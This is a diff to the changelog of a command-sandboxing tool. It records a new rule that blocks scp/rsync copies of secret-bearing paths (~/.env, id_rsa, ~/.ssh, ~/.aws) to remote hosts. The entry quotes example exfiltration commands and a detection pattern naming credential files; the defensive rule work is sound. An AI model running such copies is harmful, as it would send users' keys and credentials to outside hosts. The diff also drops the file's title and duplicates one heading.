@@ -1,6 +1,27 @@
-# Changelog
-
 ## [Unreleased]
+
+### Scoped secret-source scp/rsync to remote hosts now blocks (DF-TERMINAL-JAIL-29)
+
+- **Rule** (`builtin-net-remote-tree-copy`, engine + byte-identical YAML mirror):
+  the whole-tree arm previously left every scoped secret-bearing source
+  (`scp ~/.env host:`, `scp id_rsa host:`, `rsync /home/kara/.ssh host:/x`,
+  `scp -r ~ host:/x`) on default-allow — the exfil matrix had a hole exactly at
+  the ssh-family copy tools. A second pattern arm now blocks an rsync/scp whose
+  SOURCE carries a `~`, a `.ssh`/`.gnupg`/`.aws`/`.config`/`.env` component, or
+  an `id_rsa`/`id_ed25519`/`known_hosts`/`credentials` name when the
+  DESTINATION is remote (`host:path`, bracketed IPv6 `[...]:`, `host::module`);
+  the `~/` whole-home spelling moved from the root arm into this arm
+  (`~/(?![\w.])`), and the root arm's source lookbehind tightened
+  `(?<![\w/])` → `(?<![\w/~])` so a `/` after `~` can no longer impersonate the
+  root token (that lookbehind tolerated the `/` inside `~/.ssh`-style paths,
+  over-blocking two shapes the no-false-positive gate pins: the
+  `-o IdentityFile=~/.ssh/id_rsa` option value and `scp ~/.sshx host:/x`).
+  Plain scoped copies (`scp -r ~/proj host:/srv/`, `rsync -av ~/proj/ host:…`,
+  non-secret names, secret-to-LOCAL copies, `=`-joined option values) keep
+  their ALLOW verdict. 23 new block vectors + 17 new allow controls in
+  `plugin/test_interruptor.py` (all fail against the pre-fix engine).
+- **Docs**: README rule list + verdict table, `specs/interruptor.md` rule table
+  + verdict table, `docs/rule-catalog.md` row reworded to the new shape.
 
 ### Validator-refusal tests tolerate documented sandbox banners (DF-TERMINAL-JAIL-28)
 
@@ -14,6 +35,7 @@
   still fails. New `TestAssertRefusedContract` self-tests prove both shapes,
   enabling green runs on degraded-FS hosts with no env overrides.
 
+### Prefix-scope rule packs skip instead of installing inert (DF-TERMINAL-JAIL-22)
 ### Prefix-scope rule packs skip instead of installing inert (DF-TERMINAL-JAIL-22)
 
 - **`install.sh`**: with a custom `TERMINAL_JAIL_INSTALL_DIR` prefix and no
